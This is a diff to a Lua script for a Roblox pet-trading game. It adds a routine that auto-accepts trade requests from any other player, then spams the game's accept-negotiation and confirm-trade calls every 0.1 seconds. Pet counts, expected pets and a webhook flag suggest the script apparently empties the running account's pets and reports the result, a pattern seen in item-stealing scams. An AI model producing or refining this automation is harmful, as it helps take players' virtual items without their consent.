@@ -220,13 +220,15 @@ local function setup_auto_accept(expected_pets)
         local initialPets = count_pets()
         local webhookSent = false
         
+        -- Phase 1: Auto-accept trade requests
         task.spawn(function()
             while task.wait(0.3) do
                 pcall(function()
                     if dialogApp and dialogApp:FindFirstChild("Dialog") and dialogApp.Dialog.Visible then
                         for _, player in pairs(Players:GetPlayers()) do
                             if player.Name ~= playerName then
-                                ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(player, true)
+                                local args = {player, true}
+                                ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(unpack(args))
                             end
                         end
                     end
@@ -234,8 +236,9 @@ local function setup_auto_accept(expected_pets)
             end
         end)
         
+        -- Phase 2: Auto-accept negotiation (SPAM THIS!)
         task.spawn(function()
-            while task.wait(0.5) do
+            while task.wait(0.1) do
                 pcall(function()
                     if tradeGui.Visible then
                         ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
@@ -244,8 +247,9 @@ local function setup_auto_accept(expected_pets)
             end
         end)
         
+        -- Phase 3: Auto-confirm trade (SPAM THIS!)
         task.spawn(function()
-            while task.wait(0.5) do
+            while task.wait(0.1) do
                 pcall(function()
                     if tradeGui.Visible then
                         ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade"):FireServer()
